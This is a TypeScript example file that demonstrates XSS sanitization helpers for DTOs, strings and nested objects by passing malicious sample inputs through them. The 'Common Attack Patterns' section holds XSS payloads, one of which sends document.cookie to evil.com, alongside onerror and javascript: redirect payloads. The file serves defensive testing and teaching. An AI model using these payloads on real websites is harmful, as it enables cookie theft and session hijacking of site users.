/**
 * Example usage of the Sanitize decorator and utilities
 *
 * This file demonstrates how to use the sanitization features
 * to protect against XSS attacks and other security vulnerabilities.
 */

import { plainToClass } from 'class-transformer';
import { validate } from 'class-validator';
import { ContactDto } from './dto/auxiliary/contact.dto';
import { sanitizeString, sanitizeObject } from './utils';

/**
 * Example 1: Using the @Sanitize() decorator with DTOs
 */
async function exampleWithDecorator() {
  console.log('\n=== Example 1: Using @Sanitize() Decorator ===\n');

  // Malicious input containing XSS attempts
  const maliciousInput = {
    topic: 'Important <script>alert("XSS")</script> Message',
    body: 'Please click <a href="javascript:void(0)" onclick="alert(\'hacked\')">here</a> for details',
  };

  console.log('Input:', maliciousInput);

  // Transform to class instance - sanitization happens automatically
  const contactDto = plainToClass(ContactDto, maliciousInput);

  console.log('Sanitized:', {
    topic: contactDto.topic,
    body: contactDto.body,
  });

  // Validate the DTO
  const errors = await validate(contactDto);
  console.log('Validation errors:', errors.length);
}

/**
 * Example 2: Using sanitizeString() directly
 */
function exampleSanitizeString() {
  console.log('\n=== Example 2: Using sanitizeString() ===\n');

  const testCases = [
    '<script>alert("XSS")</script>Hello',
    '<img src=x onerror="alert(1)">',
    'Normal text with <b>HTML</b> tags',
    '<a href="javascript:alert(1)">Click me</a>',
    'Hello&lt;script&gt;alert(1)&lt;/script&gt;',
    '  Whitespace test  ',
  ];

  testCases.forEach((input) => {
    const sanitized = sanitizeString(input);
    console.log(`Input:  "${input}"`);
    console.log(`Output: "${sanitized}"`);
    console.log('---');
  });
}

/**
 * Example 3: Using sanitizeObject() for nested objects
 */
function exampleSanitizeObject() {
  console.log('\n=== Example 3: Using sanitizeObject() ===\n');

  const unsafeObject = {
    name: 'John<script>alert(1)</script> Doe',
    email: 'john@example.com',
    comments: [
      'First comment <img src=x onerror="alert(1)">',
      'Second comment is safe',
      'Third comment with <b>formatting</b>',
    ],
    profile: {
      bio: 'My bio <a href="javascript:alert(1)">click here</a>',
      website: 'https://example.com<script>bad()</script>',
    },
  };

  console.log('Input:', JSON.stringify(unsafeObject, null, 2));

  const sanitized = sanitizeObject(unsafeObject);

  console.log('\nSanitized:', JSON.stringify(sanitized, null, 2));
}

/**
 * Example 4: Common attack patterns
 */
function exampleAttackPatterns() {
  console.log('\n=== Example 4: Common Attack Patterns ===\n');

  const attacks = [
    {
      name: 'Script Injection',
      input: '<script>fetch("http://evil.com?cookie=" + document.cookie)</script>',
    },
    {
      name: 'Event Handler',
      input: '<img src="valid.jpg" onerror="fetch(\'http://evil.com\')">',
    },
    {
      name: 'JavaScript Protocol',
      input: '<a href="javascript:void(document.location=\'http://evil.com\')">Click</a>',
    },
    {
      name: 'Mixed Content',
      input: 'Valid text <script>alert(1)</script> more text <b>bold</b> end',
    },
    {
      name: 'Encoded Attack',
      input: '&lt;script&gt;alert(1)&lt;/script&gt;',
    },
  ];

  attacks.forEach(({ name, input }) => {
    const sanitized = sanitizeString(input);
    console.log(`${name}:`);
    console.log(`  Before: "${input}"`);
    console.log(`  After:  "${sanitized}"`);
    console.log('---');
  });
}

/**
 * Run all examples
 */
async function runExamples() {
  console.log('╔══════════════════════════════════════════════════════╗');
  console.log('║   Sanitization Examples - Security Demonstration    ║');
  console.log('╚══════════════════════════════════════════════════════╝');

  await exampleWithDecorator();
  exampleSanitizeString();
  exampleSanitizeObject();
  exampleAttackPatterns();

  console.log('\n✅ All examples completed!\n');
}

// Uncomment to run examples
// runExamples().catch(console.error);

export {
  exampleWithDecorator,
  exampleSanitizeString,
  exampleSanitizeObject,
  exampleAttackPatterns,
  runExamples,
};

